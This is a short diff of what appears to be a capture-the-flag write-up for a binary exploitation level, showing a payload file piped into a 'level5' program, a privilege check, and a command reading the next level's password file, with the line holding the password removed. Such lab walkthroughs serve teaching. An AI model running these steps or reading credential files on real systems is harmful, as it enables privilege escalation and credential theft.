@@ -219,7 +219,6 @@ cat /tmp/exp - | ./level5
 whoami
 level6
 cat /home/user/level6/.pass
-REMOVED
 ```
 
 Breaking the payload down:
